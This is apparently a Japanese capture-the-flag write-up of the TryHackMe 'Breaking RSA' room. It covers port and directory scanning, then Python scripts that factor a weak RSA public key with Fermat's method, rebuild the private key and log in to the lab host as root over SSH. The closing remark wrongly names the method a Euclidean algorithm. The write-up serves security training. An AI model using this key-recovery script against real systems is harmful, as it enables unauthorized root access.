# Breaking RSA CTF

https://tryhackme.com/room/breakrsa

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.127.38
sudo bash -c "echo $TARGET   xxxxxxxxx.thm >> /etc/hosts"

root@ip-10-10-228-200:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-18 00:45 BST
Nmap scan report for xxxxxxxxx.thm (10.10.127.38)
Host is up (0.00013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:34:FE:25:83:47 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds
root@ip-10-10-228-200:~# sudo nmap -sS -A -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-18 00:45 BST
Nmap scan report for xxxxxxxxx.thm (10.10.127.38)
Host is up (0.00020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Jack Of All Trades
MAC Address: 02:34:FE:25:83:47 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.20 ms xxxxxxxxx.thm (10.10.127.38)
```

SSH, HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 178] [--> http://10.10.127.38/development/]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

### /development/log.txt

```
The library we are using to generate SSH keys implements RSA poorly. The two
randomly selected prime numbers (p and q) are very close to one another. Such
bad keys can easily be broken with Fermat's factorization method.

Also, SSH root login is enabled.

<https://github.com/murtaza-u/zet/tree/main/20220808171808>

---
```

## RSAキーのビット数

```python
from Crypto.PublicKey import RSA

encoded_key = open("id_rsa.pub", "rb").read()
rsakey = RSA.import_key(encoded_key)

bits = rsakey.size_in_bits()
print(bits)
```

## n の値

```python
from Crypto.PublicKey import RSA

encoded_key = open("id_rsa.pub", "rb").read()
rsakey = RSA.import_key(encoded_key)

print(rsakey.n)
print(rsakey.e)
```

## 因数分解

```python
#!/usr/bin/python3
# gmpy2 is a C-coded Python extension module that supports
# multiple-precision arithmetic.
# pip install gmpy2
from gmpy2 import isqrt
from math import lcm

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt returns the integer square root of n
    a = isqrt(n)

    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b

(a, b) = factorize([REDACTED]>

x = a - b if a > b else b - a
print(x)
```

## p, q から 秘密鍵を作る

```python
#!/usr/bin/python3
# gmpy2 is a C-coded Python extension module that supports
# multiple-precision arithmetic.
# pip install gmpy2
from gmpy2 import isqrt
from math import lcm
from Crypto.PublicKey import RSA
import gmpy2

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will
    # always be 2
    if (n & 1) == 0:
        return (n/2, 2)

    # isqrt returns the integer square root of n
    a = isqrt(n)

    # if n is a perfect square the factors will be ( sqrt(n), sqrt(n) )
    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b


(p, q) = factorize([REDACTED])
n = p * q
phi = (p - 1) * (q - 1)
e = 65537

d = gmpy2.invert(e, phi)

private_key = RSA.construct((int(n), int(e), int(d), int(p), int(q)))

with open("id_rsa", "wb") as f:
    f.write(private_key.export_key('PEM'))
```

```shell
$ ssh root@10.10.127.38 -i ./id_rsa
```


## 振り返り

- id_rsa.pub から id_rsa を生成する流れをスクリプト化した。（通常は時間がかかりすぎて使えるものではないが、今回のようにユークリッドアルゴリズムで高速に素因数分解できる場合は使える）

```python
#!/usr/bin/python3
from gmpy2 import isqrt
from math import lcm
from Crypto.PublicKey import RSA
import gmpy2

def factorize(n):
    if (n & 1) == 0:
        return (n/2, 2)

    a = isqrt(n)

    if a * a == n:
        return a, a

    while True:
        a = a + 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    return a + b, a - b


encoded_key = open("id_rsa.pub", "rb").read()
rsakey = RSA.import_key(encoded_key)

n = rsakey.n
e = rsakey.e

(p, q) = factorize(n)

phi = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi)

private_key = RSA.construct((int(n), int(e), int(d), int(p), int(q)))

with open("id_rsa", "wb") as f:
    f.write(private_key.export_key('PEM'))
```
